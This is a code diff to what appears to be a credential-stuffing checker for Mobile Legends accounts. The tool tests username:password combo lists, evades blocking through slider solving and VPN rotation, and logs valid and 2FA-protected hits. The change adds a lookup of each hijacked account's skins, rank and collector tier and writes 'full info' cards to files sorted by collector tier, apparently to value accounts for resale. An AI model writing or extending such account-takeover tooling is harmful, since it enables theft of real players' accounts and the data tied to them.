@@ -357,6 +357,7 @@ except Exception:
 # ── Optional: info.py (Player profile lookup) ────────────────────────────────
 INFO_OK = False
 get_player_info = None
+get_full_upas_info = None
 DeviceManager = None
 INFO_IMPORT_ERR = None
 
@@ -364,6 +365,11 @@ try:
     from info import get_player_info as _gpi, DeviceManager as _DM
     get_player_info = _gpi
     DeviceManager = _DM
+    try:
+        from info import get_full_upas_info as _gfui
+        get_full_upas_info = _gfui
+    except ImportError:
+        pass
     INFO_OK = True
 except Exception as _e:
     INFO_IMPORT_ERR = f"{type(_e).__name__}: {_e}"
@@ -404,6 +410,7 @@ CACHE_STATE_FILE     = os.path.join(BASE, '.browser_vpn_cache_state.json')
 # Output files
 FILES = {
     'VALID': 'hit_valid.txt',
+    'FULL': 'full_info_upas_valid.txt',
     'OTP': 'hit_2fa.txt',
     'INVALID': 'invalid.txt',
     'ERR': 'err.txt'
@@ -4800,7 +4807,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
         slider_cleared = True
         return True
 
-    async def _lookup_player_valid(dec_d: dict):
+    async def _lookup_player_valid(dec_d: dict, upas: str = ""):
         global _lookup_exec
         guid = dec_d.get('guid', '')
         sess = dec_d.get('session', '')
@@ -4813,10 +4820,16 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                 _lookup_exec = ThreadPoolExecutor(max_workers=4, thread_name_prefix="mlbb_info")
             loop = asyncio.get_running_loop()
             _tlk = time.monotonic()
-            _res_info = await asyncio.wait_for(
-                loop.run_in_executor(_lookup_exec, get_player_info, guid_int, sess, dm, 5),
-                timeout=15.0,
-            )
+            if get_full_upas_info is not None:
+                _res_info = await asyncio.wait_for(
+                    loop.run_in_executor(_lookup_exec, get_full_upas_info, guid_int, sess, dm, upas),
+                    timeout=15.0,
+                )
+            else:
+                _res_info = await asyncio.wait_for(
+                    loop.run_in_executor(_lookup_exec, get_player_info, guid_int, sess, dm, 5),
+                    timeout=15.0,
+                )
             _PERF.record_stall('lookup', time.monotonic() - _tlk)
             return _res_info
         except Exception as ie:
@@ -4834,9 +4847,25 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
             gid_s = f"{bi_i.get('player_id')}({bi_i.get('server')})" if bi_i.get('player_id') and bi_i.get('player_id') != 'Unknown' else ''
             extra_tag = f"|ID:{gid_s}|Skin:{bi_i.get('skin_count', 0)}|Rank:{gi_i.get('current_rank', 'Unknown')}" if gid_s else ""
             append_line(FILES['VALID'], f"{user}:{passw}|{sess}|{guid}|{name}|{iso_time}{extra_tag}")
+            full_card = info_res.get('full_card') if isinstance(info_res, dict) else None
+            if full_card:
+                append_line(FILES['FULL'], full_card.rstrip('\n'))
+                bucket = str(info_res.get('collector_bucket') or '').strip()
+                if bucket:
+                    col_dir = os.path.join(OUTPUT_DIR, 'full_info_by_collector')
+                    try:
+                        os.makedirs(col_dir, exist_ok=True)
+                        with open(os.path.join(col_dir, bucket), 'a', encoding='utf-8') as f_col:
+                            f_col.write(full_card.rstrip('\n') + '\n')
+                    except OSError as e_col:
+                        dbg(f"collector write err ({bucket}): {e_col}")
             stats['valid'] += 1
             print_hit(user, passw, dec_d, info_res)
+            ci_i = info_res.get('data', {}).get('collector_info', {}) if isinstance(info_res, dict) else {}
+            col_s = ci_i.get('collector_tier', '')
             extra_tg = f"\nID: <code>{esc_html(gid_s)}</code> · Skin: {bi_i.get('skin_count', 0)} · {esc_html(gi_i.get('current_rank', ''))}" if gid_s else ""
+            if col_s:
+                extra_tg += f"\nCollector: {esc_html(col_s)}"
             return (
                 f"✅ <b>VALID</b>\n"
                 f"<code>{esc_html(user)}:{esc_html(passw)}</code>\n"
@@ -5115,7 +5144,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                         elif vpn_coord and kind == 'INVALID':
                             vpn_coord.record_ok()
                         dec_d = res_data.get('decrypted_data', {})
-                        info_res = await _lookup_player_valid(dec_d) if kind == 'VALID' else None
+                        info_res = await _lookup_player_valid(dec_d, f"{u}:{pw}") if kind == 'VALID' else None
                         _acct_retries.pop(_norm_combo_key(u, pw), None)
                         if my_gen == ctx_gen:
                             ctx_accts += 1
